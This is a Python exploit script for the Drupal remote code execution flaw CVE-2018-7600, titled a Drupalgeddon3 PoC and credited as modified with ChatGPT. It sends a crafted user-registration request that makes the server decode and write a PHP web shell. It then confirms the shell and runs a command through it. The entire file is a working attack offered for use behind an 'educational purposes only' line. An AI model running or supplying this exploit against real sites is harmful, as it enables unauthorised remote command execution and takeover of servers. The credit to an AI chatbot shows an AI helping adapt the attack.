#!/usr/bin/env python
# -*- coding: utf-8 -*-

import sys
import requests

print ('################################################################')
print ('# Drupalgeddon3 PoC (CVE-2018-7600)                             #')
print ('# Modified for webshell upload and interaction                 #')
print ('# Original: Vitalii Rudnykh | Modified by: Hardy & ChatGPT     #')
print ('################################################################')
print ('\nProvided for educational purposes only.\n')

target = input('Enter target URL (e.g., https://target.com/): ').strip()
if not target.endswith('/'):
    target += '/'

proxies = {
    # 'http': 'http://127.0.0.1:8080',
    # 'https': 'http://127.0.0.1:8080'
}
verify = True  # Set False if using Burp w/ self-signed cert

url = target + 'user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'

# Upgraded webshell (base64-encoded)
# <?php echo shell_exec($_GET['cmd']); ?>
b64_payload = 'PD9waHAgZWNobyBzaGVsbF9leGVjKCRfR0VUWydjbWQnXSk7ID8+'
php_filename = 'mrb3n.php'
param_name = 'cmd'
command = f'echo "{b64_payload}" | base64 -d | tee {php_filename}'

payload = {
    'form_id': 'user_register_form',
    '_drupal_ajax': '1',
    'mail[#post_render][]': 'exec',
    'mail[#type]': 'markup',
    'mail[#markup]': command
}

print('[*] Sending exploit payload...')
try:
    r = requests.post(url, data=payload, proxies=proxies, verify=verify, timeout=10)
except requests.exceptions.RequestException as e:
    sys.exit(f'[-] Error sending request: {e}')

shell_url = target + php_filename
print(f'[*] Checking if shell was uploaded to: {shell_url}')
try:
    check = requests.get(shell_url, proxies=proxies, verify=verify, timeout=10)
    if check.status_code == 200:
        print(f'[+] Web shell uploaded at: {shell_url}')
        print(f'[+] Try: {shell_url}?cmd=id OR ?cmd=whoami')
        test_cmd = requests.get(f"{shell_url}?cmd=id", proxies=proxies, verify=verify)
        print(f'[+] Command output:\n{test_cmd.text}')
    else:
        sys.exit('[-] Shell not found. Exploit likely failed.')
except requests.exceptions.RequestException as e:
    sys.exit(f'[-] Error checking shell: {e}')
